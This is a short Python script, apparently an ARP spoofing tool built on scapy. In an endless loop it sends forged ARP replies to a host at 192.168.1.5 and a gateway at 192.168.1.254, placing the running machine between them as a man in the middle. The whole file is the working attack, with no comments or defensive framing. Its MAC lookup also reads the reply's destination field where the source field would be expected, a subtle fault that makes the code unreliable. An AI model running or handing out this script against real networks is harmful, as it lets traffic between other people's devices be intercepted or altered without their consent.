import scapy.all as scapy
import time
def get_mac(ip):
    arp_request= scapy.ARP(pdst= ip)
    broadcast= scapy.Ether(dst= "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast= broadcast/arp_request
    answered_list = scapy.srp(arp_req_broadcast,timeout = 1, verbose=False)[0]
    return answered_list[0][1].hwdst

def spoof(target_ip,spoof_ip):
    target_mac= get_mac(target_ip)
    packet= scapy.ARP(op=2,pdst= target_ip,hwdst= target_mac,psrc= spoof_ip)
    scapy.send(packet)


while True:
    spoof("192.168.1.5","192.168.1.254")
    spoof("192.168.1.254","192.168.1.5")
    time.sleep(2)